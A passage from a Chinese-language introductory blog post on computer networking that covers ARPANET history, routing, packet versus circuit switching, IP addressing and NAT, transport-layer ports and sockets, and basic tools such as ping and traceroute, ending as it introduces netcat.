简而言之，当时美国的电话网络是典型的【多级星形拓扑】。这种拓扑的优点是：简单、高效、便于管理；但缺点是：健壮性很差。从这个案例中，大伙儿可以再次体会到“效率”与“健壮性”之间的矛盾。俺写过一篇很重要的博文（<a href="https://program-think.blogspot.com/2020/04/Government-and-System-Robustness.html">这里</a>）深入讨论了这个话题。<br>　　话说1957年的时候，苏联成功试射第一颗洲际弹道导弹（ICBM），美国军方开始担心：一旦苏联先用洲际导弹攻击美国，只要把少数几个长途局轰掉，军方的指挥系统就会瘫痪。也就是说，“长途局”已经成为美国军方的【单点故障】（何为“单点故障”？参见<a href="https://program-think.blogspot.com/2015/04/Single-Point-of-Failure.html">这篇博文</a>）。<br>　　1960年，美国国防部找来大名鼎鼎的兰德公司进行咨询，要求提供一个应对核打击的方案。该公司的研究员 <a href="https://en.wikipedia.org/wiki/Paul_Baran">Paul Baran</a> 设计了一个方案，把“星形拓扑”改为【网状拓扑】。采用【网状拓扑】的好处在于：即使发生全面核大战，大量骨干节点被摧毁，整个网络也不会被分隔成几个孤岛，军方的指挥系统依然能正常运作。</p><p><img src="https://lh5.googleusercontent.com/IE-FTOWlH2Z5OjbyXQ18nnjCRMoQrk1jfjoyIuLApcwU1AGPhu0mFgJL65IkOsvADshV1Fxbfb4bSn54Xy4m08lDE-n-mtnaSYAAGCgIUZSvVZo-8IAPPzFyLUcZdvq_JWsoUOsfdZQ" alt="不见图 请翻墙"><br>（左边：互联网诞生前——美国的电话网络　　右边：兰德公司的“Baran 方案”）</p><p>　　有了兰德公司的方案，美国军方找到当时最大的电信公司 AT＆T，想要实现这个系统，结果被否决了。AT＆T 高层认为：搞这样一种系统根本不切实际。于是 Baran 的方案中途夭折。<br>　　为啥 AT＆T 反对这个方案捏？一方面，成功的大公司总是有很强的思维定势；另一方面，Baran 的设计方案确实很超前——其前瞻性不仅包括“拓扑结构”，而且把当时电信行业的几大核心观念完全颠覆掉了（具体如何颠覆，后续章节还会再聊）。<br>　　时间一晃又过了好多年，到了60年代末，由于一系列机缘巧合，英国佬发现了“Baran 方案”的价值，并据此搞了一个小型的 NPL 网络（NPL 是“国家物理实验室”的缩写）。然后在某次 ACM 会议上，美国佬看到英国佬的论文，才意识到：Baran 方案完全可行。经历了“出口转内销”的命运之后，该方案重新被美国国防部重视。之后，（国防部下属的）“<a href="https://zh.wikipedia.org/wiki/%E5%9C%8B%E9%98%B2%E9%AB%98%E7%AD%89%E7%A0%94%E7%A9%B6%E8%A8%88%E5%8A%83%E7%BD%B2">高级计划研究局</a>”（ARPA）开始筹建“阿帕网”（ARPANET），才有了如今的互联网。</p><h3 id="◇路由的大致原理"><a href="#◇路由的大致原理" class="headerlink" title="◇路由的大致原理"></a>◇路由的大致原理</h3><p>　　聊完“拓扑”，再来聊“路由”。<br>　　当主机 A 向主机 B 发送网络层的数据时，大致会经历如下步骤：<br>1.<br>A 主机的协议栈先判断“A B 两个地址”是否在同一个子网（“子网掩码”就是用来干这事儿滴）。<br>如果是同一个子网，直接发给对方；如果不是同一个子网，发给本子网的【默认网关】。<br>（此处所说的“网关”指“3层网关/网络层网关”）<br>2.<br>对于“默认网关”，有可能自己就是路由器；也可能自己不是路由器，但与其它路由器相连。<br>也就是说，“默认网关”要么自己对数据包进行路由，要么丢给能进行路由的另一台设备。<br>（万一找不到能路由的设备，这个数据就被丢弃，于是网络通讯出错）<br>3.<br>当数据到达某个路由器之后，有如下几种可能——<br>3.1<br>该路由器正好是 B 所在子网的网关（与 B 直连），那就把数据包丢给 B，路由过程就结束啦；<br>3.2<br>亦或者，路由器会把数据包丢给另一个路由器（另一个路由器再丢给另一个路由器） …… 如此循环往复，最终到达目的地 B。<br>3.3<br>还存在一种可能性：始终找不到“主机 B”（有可能该主机“断线 or 关机 or 根本不存在”）。为了避免数据包长时间在网络上闲逛，还需要引入某种【数据包存活机制】（洋文叫做“Time To Live”，简称 TTL）。<br>通常会采用某个整数（TTL 计数）表示数据包能活多久。当主机 A 发出这个数据包的时候，这个“TTL 计数”就已经设置好了。每当这个数据包被路由器转发一次，“TTL 记数”就减一。当 TTL 变为零，这个数据包就死了（被丢弃）。</p><p>　　对于某些大型的复杂网络（比如互联网），每个路由器可能与其它 N 个路由器相连（N 可能很大）。对于上述的 3.2 情形，它如何判断：该转发给谁捏？<br>　　这时候，“路由算法”就体现出价值啦——<br>一般来说，路由器内部会维护一张【路由表】。每当收到一个网络层的数据包，先取出数据包中的【目标地址】，然后去查这张路由表，看谁距离目标最近，就把数据包转发给谁。<br>　　上面这段话看起来好像很简单，其实路由算法挺复杂滴。考虑到本文是“扫盲性质”，而且篇幅已经很长，不可能再去聊“路由算法”的细节。对此感兴趣的同学，可以去看《<a href="https://docs.google.com/document/d/1XQwaAMzuGuvmq5fCiTDMrh_pTUpCHJJ5C17btTv8kdE/">计算机网络</a>》的第5章。</p><h3 id="◇路由算法的演变史（以互联网为例）"><a href="#◇路由算法的演变史（以互联网为例）" class="headerlink" title="◇路由算法的演变史（以互联网为例）"></a>◇路由算法的演变史（以互联网为例）</h3><p>　　（技术菜鸟可以跳过这个小节）<br>　　由于互联网的 IP 协议已经成为“网络层协议”的事实标准，俺简单聊一下互联网的路由机制是如何进化滴。</p><p><strong>第1阶段：静态全局路由表</strong><br>　　（前面说了）互联网的前身是“阿帕网/ARPANET”。在阿帕网诞生初期（上世纪70年代），全球的主机很少。因此，早期的路由表很简单，既是“全局”滴，又是“静态”滴。简而言之，每个路由器内部都维护一张“全局路由表”，这个“路由表”包含了全球所有其它路由器的关联信息。每当来了一个数据包，查一下这张全局路由表，自然就清楚要转发给谁，才能最快到达目的地。<br>　　早期的阿帕网，主机的变化比较少，也很少增加路由器。每当出现一个新的路由器，其它路由器的管理员就手工编辑各自的“全局路由表”。<br>　　为了加深大伙儿印象，特意找来两张70年代初的阿帕网拓扑图（注：图中的 IMP 是“Interface Message Processor”的缩写，也就是如今所说的“路由器”）。</p><p><img src="https://lh5.googleusercontent.com/lgeICZCix4CsAg_VubQ00XSJr4eMmdOBSyINs3lbGOV25l1slX5K-6L_HHWWnj-sMQlNTVY0b01JzWL-g1zEn5y-VafJHEwLaJIwwqLEaP4I7JzxbMAk_3wvmnHO34NZYkb5rs98BtY" alt="不见图 请翻墙"><br>（1973年的阿帕网）</p><p><img src="https://lh6.googleusercontent.com/miI68qcASC4oz00YtHW6Pv_O0nLK_BZ0PWAxs4J5x-yteT2ya0gkiheH_RCIkX6ZX_soaf2tPPWbXNOYqdhtNaNbLA5OJ3w5Ko47pwXK4hmCtKmHrBmvciP1JYnZCwvUvRqlAtGllG8" alt="不见图 请翻墙"><br>（1977年的阿帕网）</p><p><strong>第2阶段：动态全局路由表</strong><br>　　后来，“阿帕网/互联网”的规模猛增，路由器数量也跟着猛增，隔三差五都有新的路由器冒出来。再用“静态路由表”这种机制，（编辑路由表的）管理员会被活活累死。于是改用“动态路由表”，并引入某种“路由发现机制”。但“路由表”依然是【全局】滴。</p><p><strong>第3阶段：动态分级路由表</strong><br>　　再到后来，全球的路由器越来越多，成千上万，再搞“全局路由表”已经不太现实了——<br>一方面，“全局路由表”越来越大（查询的速度就越来越慢）<br>另一方面，由于互联网的流量越来越大，每来一个数据包都要查表，查询越来越频繁。<br>　　于是，路由器开始吃不消了。为了解决困境，想出一个新招数：引入“分级路由”（hierarchical routing）。所谓的“分级路由”就是：把整个互联网分为多个大区域，每个大区域内部再分小区域，小区域内部再分小小区域 …… 看到这里，熟悉“数据结构与算法”的同学就会意识到——这相当于构造了一个【树状】层次结构。<br>　　有了这个层次结构，每个路由器重点关注：自己所在的那个最小化区域里面的网络拓扑。如此一来，每个路由器的“路由表”都会大幅度减小。</p><p><img src="https://lh5.googleusercontent.com/29WAIkuNnd2KC88vhFr7UG1ozUqnYQzt6k4VDmra_7Fiqu4lG4WKzEskw12GCuZgL8VKGd7aXI3KIqyGWNX8gwSRf_HzY8rDaG2VzFU9dp9q-wWYN1xyUixlefPu_MLtugsWWVBZfkE" alt="不见图 请翻墙"><br>（全局路由表 VS 分级路由表）</p><h3 id="◇互联网的路由——从“CAS”的角度看其健壮性"><a href="#◇互联网的路由——从“CAS”的角度看其健壮性" class="headerlink" title="◇互联网的路由——从“CAS”的角度看其健壮性"></a>◇互联网的路由——从“CAS”的角度看其健壮性</h3><p>　　去年（2020）俺写了一篇博文《<a href="https://program-think.blogspot.com/2020/04/Government-and-System-Robustness.html">“政治体制”与“系统健壮性”——基于“复杂性科学”的思考</a>》，其中介绍了“CAS”（复杂自适应系统）的概念。互联网的路由机制，就是一个典型的 CAS。<br>　　如果把互联网视作一个系统，每个公网上的路由器都是一个自适应的主体。假如某个地区的网络流量突然暴涨，骨干网路由器会自动分流；假如因为地震或战争，导致某个地区的骨干网路由器全部下线，周边地区的路由器也会自动避开这个区域 …..<br>　　所有这些工作，【不需要】依靠任何最高指挥中枢，去进行协调。<br>　　相反，如果互联网的路由系统中，设立了某种“中央委员会”进行实时调度，那互联网早就完蛋了，根本无法成长为今天这种规模。</p><h3 id="◇网络层的两种交换技术——电路交换（circuit-switching）-VS-分组交换（packet-switching）"><a href="#◇网络层的两种交换技术——电路交换（circuit-switching）-VS-分组交换（packet-switching）" class="headerlink" title="◇网络层的两种交换技术——电路交换（circuit switching） VS 分组交换（packet switching）"></a>◇网络层的两种交换技术——电路交换（<a href="https://en.wikipedia.org/wiki/Circuit_switching">circuit switching</a>） VS 分组交换（<a href="https://en.wikipedia.org/wiki/Packet_switching">packet switching</a>）</h3><p>　　（技术菜鸟可以跳过这个小节）<br>　　前面聊“互联网诞生”，说到兰德公司的“Baran 方案”。该方案对当时的电信系统提出几大革命性的变化，其中之一就是“分组交换”技术（也称“数据包交换”or“封包交换”）。<br>　　一般来说，网络层的设计有两种截然不同的风格：【电路交换 VS 分组交换】。有时候也分别称之为“有连接的网络层 VS 无连接的网络层”。此处所说的“连接”指的是某种“虚电路”（洋文叫做“<a href="https://en.wikipedia.org/wiki/Virtual_circuit">virtual circuit</a>”，简称 VC）。</p><p>　　要理解“虚电路”，首先要从老式的电话系统说起。<br>　　最早期的电话，既没有拨号盘也没有按键，全靠一张嘴。当你拿起电话，先告诉接线员你要打给谁，接线员会用一根跳接线，插入电话交换设备的某个插孔，从而把你的电话机与对方的电话机相连。于是建立了一条两人之间的电话通路，也就是“电路”。你可以把“接线员”想象成某种“人肉路由器” :)</p><p><img src="https://lh4.googleusercontent.com/Ry_GjLe2vTj2fr1dnvGbwn4O6JbFbaEYKPKQyP1UMNba0AKt85b_SmM_fZhlnhBePly-ByLsI3v_r978aUKRY4AAG54ws1yPZglIbOuXZOKvP3vqjvqNdX8MOk0L0CW2vhoGpnI-Jcc" alt="不见图 请翻墙"><br>（1900年法国巴黎的电话交换局，可以看到接线员在操作电话交换设备）</p><p>　　后来发明了“自动电话交换机”，导致“接线员”全体下岗。虽然自动化了，但原理还是一样——当你在电话上拨了某人的号码，电话局的交换机会自动选择一条线路。只有当这条线路建立起来，对方的电话才会响。一旦双方开始通话，双方之间的语音都是通过这条线路传输。并且这条线路是独占的——只要通话不挂断，这条线路就不会再分配给其他人使用。</p><p>　　前面提到“互联网诞生的历史”，当时军方推动的“Baran 方案”被 AT＆T 断然拒绝。因为这个方案完全颠覆了传统的电话系统——<br>颠覆之1：把“模拟信号”颠覆为“数字信号”（这点比较好理解，俺就不解释了）<br>颠覆之2：把“星形拓扑”颠覆为“网状拓扑”（关于这点，前面的小节已经讨论了）<br>颠覆之3：把“电路交换”颠覆为“分组交换”（这就是本小节的重点）</p><p>　　为了帮大伙儿理解上述第3点，举个例子：<br>　　假设主机 A 要向主机 B 发送一大坨数据。因为数据太多，肯定要分成好几坨小一点的（分成多个数据包）。如何把这些数据包发送给对方捏？</p><p><strong>“电路交换”的实现方式</strong><br>在发送数据之前，要先建立连接通道（通过路由算法，找出 A ＆ B 之间的某条通路）。这条通路就是所谓的“虚电路/VC”。一旦 VC 建立，每一个数据包都是从这条拓扑路径进行路由。</p><p><strong>“分组交换”的实现方式</strong><br>在发送数据之前，【不需要】建立通道，让每个数据包独立进行路由。这种情况下，这几个数据包可能会走【不同的】拓扑路径。因此，数据包到达的顺序与发送的顺序【不一定】相同。接收方收到所有数据包之后，还要自己进行排序。<br>　　维基百科上有一个 GIF 动画（<a href="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f6/Packet_Switching.gif/480px-Packet_Switching.gif">这个链接</a>），比较直观地演示“分组交换/封包交换”的效果。由于这个动画稍微有点大（超过 1MB），俺就不贴到博文中了。</p><p>　　当时的电话系统主要承载语音传输，“电路交换”显然性能更高。那为啥 Baran 的设计要采用“分组交换”捏？俺又要再次提到【效率 VS 健壮性】之间的矛盾与均衡。<br>　　对于“电路交换”，一旦建立连接，同一个连接的所有数据都走相同的路径（会经过完全相同的路由器）。也就是说，传输的过程中，如果某个路由器挂掉了（网络掉线 or 硬件当机 or 软件崩溃）。那么，该路由器正在处理的 N 个连接全都要报废。而“分组交换”则更加灵活——即使某个路由器挂掉了，后续的数据包会自动转向另外的路由器，损失很小。<br>　　“Baran 方案”之所以采用“分组交换”的设计，因为人家这个方案是提交给军方用来应对【全面核战争】滴，当然要考虑健壮性啦。</p><p>　　话说这两种交换机制，各有很多支持者，并分裂为两大阵营，分别是：“电信阵营 VS 互联网阵营”。两大阵营的口水战持续了 N 年，都无法说服对方。到了后来设计 OSI 模型的时候，为了保持中立性与通用性，OSI 模型本身并没有强制要求网络层采用哪一种风格。<br>　　经过几十年之后，咱们已经可以看出来：“互联网阵营”占据主导地位。如今，连电信系统都是架构在互联网之上。</p><h2 id="★网络层：具体实例"><a href="#★网络层：具体实例" class="headerlink" title="★网络层：具体实例"></a>★网络层：具体实例</h2><h3 id="◇网络层的【协议】"><a href="#◇网络层的【协议】" class="headerlink" title="◇网络层的【协议】"></a>◇网络层的【协议】</h3><p>　　网络层的协议有很多。由于“互联网”已经成为全球的事实标准，因此俺只列出属于“互联网协议族”的那些“网络层协议”：<br>IP 协议（含 <a href="https://en.wikipedia.org/wiki/IPv4">IPv4</a> ＆ <a href="https://en.wikipedia.org/wiki/IPv6">IPv6</a>）<br><a href="https://en.wikipedia.org/wiki/Internet_Control_Message_Protocol">ICMP</a><br><a href="https://en.wikipedia.org/wiki/Internet_Group_Management_Protocol">IGMP</a><br><a href="https://en.wikipedia.org/wiki/IPsec">IPSec</a><br>……<br>（考虑到篇幅）俺不可能具体细聊这些协议，只是贴出每个的维基百科链接，感兴趣的同学自己点进去看。<br>　　对上述这些协议，最重要的当然是 IP 协议。如果你想要深入了解 IP 协议，可以参考如下这本书。关于 IP 协议的书，此书的影响力最大。这本书共3卷，通常只需看第1卷。<br>《<a href="https://docs.google.com/document/d/1Fw2wSr-MgNm1d_M6F-rF1t_n3LwFWWBHrJt6vcYGta4/">TCP-IP 详解</a>》</p><h3 id="◇网络层的【协议实现】"><a href="#◇网络层的【协议实现】" class="headerlink" title="◇网络层的【协议实现】"></a>◇网络层的【协议实现】</h3><p>　　对于电脑主机（含移动设备），网络层的协议实现通常包含在操作系统自带的网络模块中（也就是“操作系统协议栈”）。具体参见如下示意图。<br>　　另外，还有一些专门的【3层】网络设备，也提供网络层的功能（参见本章节的后续小节）。</p><p><img src="https://lh4.googleusercontent.com/uYGaEvDYmziV-6EZ1AnRskoGpyKwxBcHgV5wgVtsDKmyP37OQgfX_zPYYeV3drFWBATFb95DYIwMPCgNApfg9Vtxrrpyvept6LNDQi0Vh3Fp6d31LFarI4ZjY1mSaQqP94HJaVQHBEQ" alt="不见图 请翻墙"><br>（OSI 模型中，不同层次的协议实现）</p><h3 id="◇IP-地址的格式及含义"><a href="#◇IP-地址的格式及含义" class="headerlink" title="◇IP 地址的格式及含义"></a>◇IP 地址的格式及含义</h3><p>　　当年设计阿帕网的时候，采用了【4字节】（32比特）来表示“网络层地址”（也就是 IP 地址）。<br>　　“IP 地址”的含义很重要，俺有必要解释一下：<br>　　咱们平时所说的 IP 地址，采用【点分十进制】来表示。就是把地址的4个字节，先翻译为十进制，然后每个字节用一个小数点分隔开（参见如下示意图）：</p><p><img src="https://lh5.googleusercontent.com/MCf0UTOAGLTbDJ5l46RlSHfidNm4PY7xqHrOBTP0P9OOneffxtC1B-VH_W2uBE7kCetsEMqTuLcS4niwj4MvqsXEA6QLeIvjTXQlGtBmgzL1d7VgrA5Na7YguV7OBKGzk9qvx_FrFHM" alt="不见图 请翻墙"><br>（4字节 IP 地址：“二进制”与“点分十进制”的对照示意图）</p><p>　　“IP 地址”的32比特，分为两部分：第1部分用来标识【子网】，第2部分用来标识该子网中的【主机】。<br>　　这两部分各占用多少比特，是不确定的。在这种情况下，“操作系统协议栈”如何知道哪些比特标识“子网”，哪些比特标识“主机”捏？奥妙在于【子网掩码】。所以，大伙儿在给系统配置 IP 地址的时候，通常都需要再设置一个【子网掩码】，就这个用途。</p><h3 id="◇IP-地址枯竭，及其解决方法"><a href="#◇IP-地址枯竭，及其解决方法" class="headerlink" title="◇IP 地址枯竭，及其解决方法"></a>◇IP 地址枯竭，及其解决方法</h3><p>　　前一个小节提到：IP地址包含【4字节】（32比特）。因此，最多只能表示【2的32次方】（42亿左右）的不同地址。考虑到还有很多地址保留给特殊用途，实际可用地址远远不到42亿。<br>　　到了如今，全球网民都已经几十亿了，IP 地址开始枯竭。咋办捏？为了解决这个问题，发展出若干技术手段。简单说一下最常见的几种手段：</p><p><strong>IPv6</strong><br>　　名气最大（最多人知道）的技术手段，大概是 IPv6 了。这招想要一劳永逸地解决地址枯竭的问题，采用了16字节（128比特）来表示 IP 地址。<br>　　设计 IPv6 的人自豪地宣称：即使给地球上的每一粒沙子分配一个 IPv6 地址，依然绰绰有余（确实没有吹牛，“2的128次方”是天文数字）。<br>　　但 IPv6 的缺点在于，【无法】向下兼容原有的 IP 协议（原有的协议叫“IPv4”）。IPv6 的普及一直比较慢，这是主要原因。</p><p><strong>代理服务器（proxy）</strong><br>　　一看到代理，很多人就想到翻墙。其实它也可以用来解决“地址枯竭”的问题。<br>　　比如说，某个公司有100人，100台电脑。如果每台电脑都分配公网 IP 地址，就要消耗100个公网地址（太浪费啦）。<br>　　可以只申请一个公网 IP，然后在内网搞一个代理服务器，公网 IP 分配给它（代理服务器有两个网卡，一个接内网，一个接公网）。然后在其它电脑上设置代理，指向这台代理服务器，就都可以上外网啦。<br>　　（注：在本文的末尾有一个 ★杂项 的章节，会专门聊一下“代理”这个话题）</p><p><strong><a href="https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2">网络地址转换</a>（NAT）</strong><br>　　前面 proxy 那招有个缺点：内网的每台电脑里面的每个上网软件，都要单独设置代理。实在太麻烦啦！<br>　　后来就发明了某种更牛逼的招数——网络地址转换（洋文是“Network Address Translation”，简称 NAT）。<br>　　用了这招，还是只要申请一个公网 IP，分配给内网的网关（网关有两个网卡，一个接内网，一个接公网）。然后在内网的网关配置 NAT 功能，自动就可以让内网的每台电脑访问外网。<br>　　在<a href="https://program-think.blogspot.com/2012/12/system-vm-5.html">这篇博文</a>，俺介绍了虚拟机的几种“网卡模式”，其中有一种模式叫做【NAT 模式】，就是指这个玩意儿。<br>　　采用了 NAT 技术之后，可能会对某些应用软件（尤其是 P2P 类型的）造成兼容性问题，于是又发明了一些“NAT 穿透技术”（<a href="https://en.wikipedia.org/wiki/NAT_traversal">NAT traversal</a>）。这类技术有好几种，如果有空的话，俺会单独写教程介绍。</p><p><strong>其它解决方法</strong><br>　　关于“IPv4 地址空间耗尽”，解决方法肯定不止上面这几招。限于篇幅，就此打住。更多的讨论参见维基百科的“<a href="https://en.wikipedia.org/wiki/IPv4_address_exhaustion">这个链接</a>”。</p><h3 id="◇网络层相关的【网络设备】"><a href="#◇网络层相关的【网络设备】" class="headerlink" title="◇网络层相关的【网络设备】"></a>◇网络层相关的【网络设备】</h3><p><strong><a href="https://zh.wikipedia.org/wiki/%E8%B7%AF%E7%94%B1%E5%99%A8">路由器</a>（router）</strong><br>　　（前面章节聊“路由原理”的时候，已经介绍过它；这里就不再浪费口水啦）</p><p><strong>3层交换机（Layer 3 switching）</strong><br>　　“3层交换机”是在“2层交换机”的基础上，增加了对网络层的处理。因此，它可以做到类似路由器的效果——在几个子网之间转发数据。<br>　　与路由器的差别在于——“3层交换机”链接的几个子网是【同种】网络；而路由器可以连接【异种】网络。<br>　　从上面这句话看，“3层交换机”的能力显然不如“路由器”。既然已经有“路由器”，为啥还要发明“3层交换机”捏？这就要说到【单臂路由器】的弊端。<br>　　对于企业内网的“2层交换机”，通常都支持 VLAN 功能。通俗地说：可以在交换机中划分多个【虚拟子网】。其实这些子网的中所有的电脑，都还是接入这台交换机，只不过这些子网配置了不同的网络地址。对于同一个 VLAN 内部的通讯，“2层交换机”自己就可以搞定（只需要用到2层协议）；但对于【跨】VLAN 主机之间的通讯，“2层交换机”就没戏啦（它没有路由功能）。因此，就必须在它旁边外加一个路由器，形成如下拓扑结构。在这个拓扑中，路由器只与单个设备（2层交换机）相连，所以称之为“单臂”。<br>　　请注意：如下示意图只画了两台电脑，位于两个 VLAN。实际上可能有很多个 VLAN，每个里面有几十台电脑。于是，交换机与路由器之间的传输通道就会成为瓶颈——【跨】VLAN 的任意两台电脑通讯，数据包都要到路由器那里兜一圈。为了消除这种瓶颈，才发明了“3层交换机”——把路由功能直接集成到交换机内部。</p><p><img src="https://lh4.googleusercontent.com/FTo8x8w2DwhPaz10fDJ2LdwywSaaPLlciSaH4wg0HY_sHKT0MHvDN6k2ZxAvyzojuzGpklzg7hBV1iolR40_1_LaxIqYeOa1lo0IWQrb0_cpJzoGQbdZCu7fPcgieH897MuEPwlA5Gw" alt="不见图 请翻墙"><br>（“单臂路由器”的拓扑结构）</p><p><strong><a href="https://zh.wikipedia.org/wiki/%E7%84%A1%E7%B7%9A%E6%8E%A5%E5%85%A5%E9%BB%9E">无线热点</a>（Wireless Access Point）</strong><br>　　“无线热点”通常用来提供无线接入，使得某个【无线】设备能接入到某个【有线】网络中。一般来说，热点都内置了路由功能，那么它就是“无线路由器”，对应到“3层”（网络层）。反之，如果没有路由功能，它就是“网桥”，属于“2层”（链路层）。</p><h3 id="◇网络层相关的【软件工具】"><a href="#◇网络层相关的【软件工具】" class="headerlink" title="◇网络层相关的【软件工具】"></a>◇网络层相关的【软件工具】</h3><p><strong><a href="https://en.wikipedia.org/wiki/Ping_(networking_utility)">ping</a></strong><br>　　这个命令，很多人应该都知道。早在 Win9x 就有这个命令了。它使用（网络层的）ICMP 协议来测试某个远程主机是否可达。<br>　　提醒一下：<br>　　如果 ping 命令显示某个 IP 地址不可达，有很多种情况。比如说：</p><blockquote><p>这个 IP 地址对应的主机已经关机<br>这个 IP 地址对应的主机已经断线<br>这个 IP 地址对应的主机拒绝响应 ICMP 协议<br>从你本机到这个 IP 地址之间，有某个防火墙拦截了 ICMP 协议<br>……</p></blockquote><p><strong><a href="https://en.wikipedia.org/wiki/Traceroute">traceroute</a></strong><br>　　这是一个通用的工具，用来测试路由。很早以前的 Windows 就已经内置了它，命令是 <code>tracert</code>。在 POSIX（Linux＆UNIX）上通常叫 <code>traceroute</code><br>　　你可以用这个命令，测试你本机与互联网另一台主机之间的路由（也就是：从你本机到对方主机，要经过哪些路由器）</p><h2 id="★传输层：概述"><a href="#★传输层：概述" class="headerlink" title="★传输层：概述"></a>★传输层：概述</h2><h3 id="◇传输层的必要性"><a href="#◇传输层的必要性" class="headerlink" title="◇传输层的必要性"></a>◇传输层的必要性</h3><p><strong>屏蔽“有连接 or 无连接”的差异</strong><br>　　（上一个章节提到）网络层本身已经屏蔽了【异种网络】的差异（比如“以太网、ATM、帧中继”之间的差异），而且网络层也屏蔽了路由的细节。但网络层本身还有一个差异，也就是网络层的两种交换技术：电路交换（有连接） VS 分组交换（无连接）。<br>　　前面章节也提到了：上述两种交换技术各有很多支持者，并分裂为两大阵营。当年设计 OSI 模型的时候，为了保持中立性与通用性，并没有强制规定“网络层”必须采用何种交换机制。<br>　　对于开发网络软件的程序员来说，当然不想操心“网络层用的是哪一种交换机制”。因此，需要对网络层的上述差异再加一个抽象层（也就是“传输层”）。</p><p><strong>从“主机”到“进程”</strong><br>　　前面介绍的“网络层”，其设计是面向主机（电脑）。“网络层地址”也就是某个主机的地址。<br>　　而“传输层”是面向【进程】滴！因为传输层要提供给【网络软件】使用，而网络软件打交道的对象是【另一个网络软件】。因此，传输层必须在“网络层地址”的基础上，再引入某种新的标识，用来区分同一台主机上的不同【进程】。</p><h3 id="◇传输层的特殊性"><a href="#◇传输层的特殊性" class="headerlink" title="◇传输层的特殊性"></a>◇传输层的特殊性</h3><p>　　在 OSI 7层模型中，传输层正好居中。这是一个很特殊的位置。<br>　　OSI 模型最下面3层，与【网络设备】比较密切。这里面所说的“网络设备”，既包括那些独立的主机（比如“路由器、交换机、等”），也包括电脑上的硬件（比如“网卡”）。<br>　　OSI 模型最上面3层，与【网络软件】比较密切（或者说，与“用户的业务逻辑”比较密切）。<br>　　而中间的传输层，正好是承上启下。对于开发应用软件的程序猿/程序媛，“传输层”是他们能感知的最低一层。</p><h3 id="◇传输层的【端口】"><a href="#◇传输层的【端口】" class="headerlink" title="◇传输层的【端口】"></a>◇传输层的【端口】</h3><p>　　刚才谈“传输层的必要性”，提到说——“网络层地址”只能标识【主机】，而传输层必须要能标识【进程】。为了达到这个目的，于是就引入了“传输层端口”这个概念（为了打字省力，后续讨论简称为“端口”）。<br>　　在 OSI 模型中，“端口”的官方称呼是“传输服务访问点”（洋文缩写 TSAP）。但是作为程序员，俺已经习惯于“端口”这个称呼。后续介绍依然用“端口”一词。<br>　　当程序员使用传输层提供的 API 开发网络软件时，通常把“端口”与“网络地址”一起使用（构成“二元组”），就可以定位到某个主机上的某个进程。</p><h2 id="★传输层：具体实例"><a href="#★传输层：具体实例" class="headerlink" title="★传输层：具体实例"></a>★传输层：具体实例</h2><h3 id="◇传输层的【协议】"><a href="#◇传输层的【协议】" class="headerlink" title="◇传输层的【协议】"></a>◇传输层的【协议】</h3><p>　　为了让程序员可以更爽地使用传输层来开发网络软件，传输层既要提供“有连接”的风格，也要提供“无连接”的风格。关于这两种风格的对比，前面已经聊过，这里不再浪费口水。<br>　　具体到“互联网协议族”，有两个主要的传输层实现，分别是 TCP ＆ UDP（前者是“有连接”，后者是“无连接”）。<br>　　除了 TCP ＆ UDP，“互联网协议族”还提供了其它一些传输层协议。因为比较冷门，俺就不介绍啦。</p><h3 id="◇传输层的【协议实现】"><a href="#◇传输层的【协议实现】" class="headerlink" title="◇传输层的【协议实现】"></a>◇传输层的【协议实现】</h3><p>　　对于电脑主机（含移动设备），传输层的协议实现通常包含在操作系统自带的网络模块中（也就是“操作系统协议栈”）。具体参见如下示意图。<br>　　另外，还有一些专门的【4层】网络设备，也提供传输层的功能（参见后续的小节）。</p><p><img src="https://lh4.googleusercontent.com/uYGaEvDYmziV-6EZ1AnRskoGpyKwxBcHgV5wgVtsDKmyP37OQgfX_zPYYeV3drFWBATFb95DYIwMPCgNApfg9Vtxrrpyvept6LNDQi0Vh3Fp6d31LFarI4ZjY1mSaQqP94HJaVQHBEQ" alt="不见图 请翻墙"><br>（OSI 模型中，不同层次的协议实现）</p><h3 id="◇套接字（socket-API）"><a href="#◇套接字（socket-API）" class="headerlink" title="◇套接字（socket API）"></a>◇套接字（socket API）</h3><p>　　前面说了：传输层是面向程序员（让他们可以更方便地开发网络软件）。因此，就需要提供一些封装传输层的【库】（API）。程序员只需要调用这些【库】，就可以使用传输层的协议进行通讯啦。<br>　　影响力最大的传输层封装库，当然是 socket API。它来自加州大学伯克利分校。<br>　　在互联网诞生初期，伯克利分校开发了一个 UNIX 操作系统的的变种，叫做“伯克利 UNIX 发行版”（BSD Unix），也就是如今 BSD 操作系统的前身。伯克利发行版内置了一套用来进行网络编程的 API，当时叫做“伯克利套接字”（<a href="https://en.wikipedia.org/wiki/Berkeley_sockets">Berkeley sockets</a>）。由于这套 API 用起来很方便，很多其它的 UNIX 变种也移植了这套 API，于是就逐渐成了业界的事实标准。到了上世纪90年代，Windows ＆ Linux 也都提供了这套 API。<br>　　由于大部分读者不是程序员，“套接字”这个话题就到此为止。如果你是个程序员，并且对网络编程感兴趣，可以参考<a href="https://github.com/programthink/books">俺的电子书清单</a>，其中有一个分类目录是【IT 类 / 软件开发 / 网络相关】。</p><h3 id="◇传输层相关的【网络设备】"><a href="#◇传输层相关的【网络设备】" class="headerlink" title="◇传输层相关的【网络设备】"></a>◇传输层相关的【网络设备】</h3><p><strong>4层交换机（Layer 4 switching）</strong><br>　　前面已经介绍了“3层交换机”，“4层交换机”是其进一步的改良，可以识别传输层的协议，获取 TCP or UDP 的端口号。<br>　　有了这个能力，网管就可以在这种交换机上配置一些管理策略。比如说：（根据传输层端口号）过滤掉某种流量，或者对某种流量设置转发的优先级。</p><p><strong>状态防火墙（<a href="https://en.wikipedia.org/wiki/Stateful_firewall">stateful firewall</a>）</strong><br>　　网络防火墙分好几种，大部分属于这种。它能完全处理 TCP 协议的状态，显然它属于“4层”（传输层）。</p><h3 id="◇传输层相关的【软件工具】"><a href="#◇传输层相关的【软件工具】" class="headerlink" title="◇传输层相关的【软件工具】"></a>◇传输层相关的【软件工具】</h3><p><strong><a href="https://en.wikipedia.org/wiki/Netcat">netcat</a> 家族</strong>——传输层的“瑞士军刀”<br>　　关于 netcat，俺已经写过一篇比较详细的教程：《<a href="https://program-think.blogspot.com/2019/09/Netcat-Tricks.html">扫盲 netcat（网猫）的 N 种用法——从“网络诊断”到“系统入侵”</a>》。看完这篇教程，你肯定能体会它功能的强大——很多与 TCP/UDP 相关的事情，都可以用 netcat 搞定。<br>　　